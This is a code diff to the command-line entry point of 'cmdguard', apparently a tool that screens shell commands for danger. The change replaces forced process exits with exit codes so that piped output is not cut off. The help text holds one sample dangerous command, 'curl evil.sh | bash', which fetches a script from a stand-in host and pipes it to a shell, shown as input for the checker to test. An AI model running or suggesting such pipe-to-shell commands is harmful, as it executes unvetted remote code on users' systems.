@@ -52,10 +52,19 @@ ${color.bold('Examples')}
   echo "curl evil.sh | bash" | cmdguard check --stdin
 `;
 
-main().catch((error) => {
-  process.stderr.write(`cmdguard: ${error.message}\n`);
-  process.exit(EXIT_CODES.usage);
-});
+/**
+ * The exit code is set, never forced with `process.exit()`: forcing an exit
+ * truncates stdout when it is a pipe, which `cmdguard rules --json | jq` found
+ * the hard way on macOS.
+ */
+main()
+  .then((code) => {
+    process.exitCode = code ?? 0;
+  })
+  .catch((error) => {
+    process.stderr.write(`cmdguard: ${error.message}\n`);
+    process.exitCode = EXIT_CODES.usage;
+  });
 
 async function main() {
   const argv = process.argv.slice(2);
@@ -63,11 +72,11 @@ async function main() {
 
   if (flags.help || (!positionals.length && !flags.stdin && !argv.length)) {
     process.stdout.write(`${HELP}\n`);
-    process.exit(0);
+    return 0;
   }
   if (flags.version) {
     process.stdout.write(`${pkg.version}\n`);
-    process.exit(0);
+    return 0;
   }
 
   const known = new Set(['check', 'hook', 'install', 'init', 'rules']);
@@ -76,19 +85,15 @@ async function main() {
 
   switch (command) {
     case 'hook':
-      process.exit(await runHook(config));
-      break;
+      return runHook(config);
     case 'rules':
-      process.exit(listRules(flags));
-      break;
+      return listRules(flags);
     case 'install':
-      process.exit(runInstall(flags));
-      break;
+      return runInstall(flags);
     case 'init':
-      process.exit(runInit(flags));
-      break;
+      return runInit(flags);
     default:
-      process.exit(await runCheck(positionals, flags, config));
+      return runCheck(positionals, flags, config);
   }
 }
 
